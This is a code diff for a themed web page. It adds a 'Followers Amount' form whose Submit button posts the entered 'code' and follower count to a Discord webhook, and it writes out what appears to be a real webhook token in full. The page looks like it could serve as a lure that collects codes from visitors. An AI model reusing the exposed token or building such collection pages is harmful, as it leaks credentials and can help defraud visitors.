@@ -130,6 +130,13 @@
     box-shadow: 0 0 40px #00ccff;
   }
 
+  .status {
+    margin-top: 15px;
+    font-size: 1rem;
+    color: #00ffcc;
+    text-shadow: 0 0 10px #00ccff;
+  }
+
   footer {
     text-align: center;
     margin-top: 40px;
@@ -166,7 +173,8 @@
   <label for="followers">Followers Amount:</label>
   <input type="number" id="followers" placeholder="Enter followers amount">
   
-  <button class="submit-btn">Submit</button>
+  <button class="submit-btn" onclick="sendToWebhook()">Submit</button>
+  <div id="status" class="status"></div>
 </div>
 
 <footer>
@@ -174,6 +182,40 @@
 </footer>
 
 <script>
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1411854996315705424/WDbWPIIAE9VTmLo7Yk55ittfju6dz9BOhn-2mFYnTBxevwAYHbS3OflT8w7CiOm2vDkq"; // <-- Replace this with your webhook
+
+function sendToWebhook() {
+  const code = document.getElementById("code").value;
+  const followers = document.getElementById("followers").value;
+  const statusDiv = document.getElementById("status");
+
+  if (!code || !followers) {
+    statusDiv.textContent = "Please fill out both fields!";
+    return;
+  }
+
+  const payload = {
+    content: `📩 New Submission:\n🔑 Code: **${code}**\n👥 Followers: **${followers}**`
+  };
+
+  fetch(WEBHOOK_URL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload)
+  })
+  .then(res => {
+    if (res.ok) {
+      statusDiv.textContent = "✅ Sent to Discord!";
+    } else {
+      statusDiv.textContent = "❌ Failed to send!";
+    }
+  })
+  .catch(() => {
+    statusDiv.textContent = "⚠️ Error sending request!";
+  });
+}
+
+// --- Light blue glowing particles ---
 const canvas = document.getElementById('particles');
 const ctx = canvas.getContext('2d');
 canvas.width = window.innerWidth;
